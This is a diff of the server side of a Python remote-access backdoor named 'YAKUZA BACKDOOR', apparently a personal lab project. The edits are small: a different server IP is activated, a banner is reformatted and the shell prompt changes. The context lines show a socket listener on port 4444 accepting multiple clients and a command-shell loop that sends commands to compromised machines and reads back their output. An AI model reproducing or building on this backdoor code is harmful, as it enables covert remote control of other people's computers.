@@ -34,8 +34,8 @@ arrAddresses = []  # Store All Socket Connection Addresses
 arrConnections = []  # Store All Connection Information about Socket Connections
 
 # TODO: for testing change SERVER_HOST to Kali WSL IP Address
-SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
-# SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
+SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
+# SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
 SERVER_PORT = 4444  # Server Port
 
 intBuff = 1024  # Maximum Size(Bytes) of Data to Receive as
@@ -87,7 +87,8 @@ def socket_bind():
     global objSocket  # noqa
     try:
         print(fColors.BLACK + bColors.WHITE + StringFormat.BOLD +
-              center(60*" ", "\n[***] Welcome to YAKUZA BACKDOOR SERVER Side.! [***]\n") + fColors.RESET)
+              "\n[***] Welcome to YAKUZA BACKDOOR SERVER Side.! [***]\n" + fColors.RESET)
+
         print(fColors.GREEN + f"\n[+] Listening on Port: {str(SERVER_PORT)}" + fColors.RESET)
         objSocket.bind((SERVER_HOST, SERVER_PORT))  # noqa
         objSocket.listen(20)
@@ -95,6 +96,7 @@ def socket_bind():
     except SocketError as e:
         print(f'{fColors.LIGHT_RED}[-] Error while Binding Socket. \n[-] Error: {fColors.WHITE}{e}{fColors.RESET}')
         socket_bind()
+        #we can use socket_bind() without using loop
 
 
 # Step 7: Define Function to Accept Socket
@@ -310,7 +312,7 @@ def command_shell():
     # 1. Give Command from user, 2. Send Command to the Client, 3. Receive Command Output from the Client
     while True:
         # 1. Give Command from the user
-        strCommand = input('>> ')
+        strCommand = input('')
 
         # 2. Send Command to the Client
         # Send 'goback' to the client to close the Command Prompt and Back to the Command Mode(menu)
@@ -322,6 +324,7 @@ def command_shell():
             print(fColors.LIGHT_RED +
                   "[-] You Can't Use Command Prompt in the Command Prompt, Don't Use 'cmd' Command" + fColors.RESET)
 
+
         # elif len(str(strCommand)) > 0 Mean Command Submit and should send to the Client
         elif len(str(strCommand)) > 0:
             send(str.encode(strCommand))
@@ -331,6 +334,8 @@ def command_shell():
 
             # First Receive len of stdout+stderr
             intBuffer = int(decode_utf8(recv(intBuff)))
+
+
             # Then Receive stdout+stderr completely
             strClientResponse = decode_utf8(recvall(intBuffer))
 
